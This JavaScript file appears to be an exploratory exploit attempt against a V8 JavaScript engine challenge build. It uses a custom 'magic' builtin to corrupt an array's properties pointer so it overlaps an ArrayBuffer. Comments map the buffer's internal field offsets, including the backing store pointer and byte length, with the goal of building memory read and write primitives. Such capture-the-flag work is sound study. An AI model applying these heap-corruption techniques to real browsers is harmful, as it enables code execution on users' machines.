// Butterfly Effect - Property Corruption Exploit
const N = 73;
let arr = [1.1, 2.2];
for (let i = 0; i < N; i++) {
    arr['p' + i] = i;
}

// Create target ArrayBuffer  
let ab = new ArrayBuffer(0x200);
let dv = new DataView(ab);

console.log("Original ArrayBuffer byte_length:", ab.byteLength);

// The ONE magic call - corrupt arr's properties pointer to point to ab
arr.magic(arr.length, 43);

console.log("After magic, trying to access corrupted properties...");

// Now arr.properties should point to ab instead of the NameDictionary
// Try to access/modify ab's internal fields through arr's properties

// Try different property accesses to explore what we can do
try {
    // See what properties we can access now
    console.log("arr.p0 =", arr.p0);
    console.log("arr.p1 =", arr.p1);
    
    // Try to find ArrayBuffer fields
    // According to the debug output, ArrayBuffer layout is:
    // - offset 0: map
    // - offset 8: properties  
    // - offset 16: elements
    // - offset 24-31: cpp_heap_wrappable/flags
    // - offset 32-39: backing_store pointer
    // - offset 40-47: byte_length
    // - offset 48-55: max_byte_length
    
    // If we can write to these through the corrupted properties...
    // Try modifying byte_length by setting a property
    
    // First, let's try to leak/read using property access
    for (let key in arr) {
        if (key.startsWith('p') && parseInt(key.substring(1)) < 10) {
            console.log(`arr.${key} = ${arr[key]} (type: ${typeof arr[key]})`);
        }
    }
    
} catch(e) {
    console.log("Error accessing properties:", e);
}

// Check if ArrayBuffer was affected
console.log("ArrayBuffer byte_length after:", ab.byteLength);

// Even if byte_length wasn't directly corrupted, we might have other primitives
// Try to use what we have to build further exploitation
console.log("Exploit attempt completed");
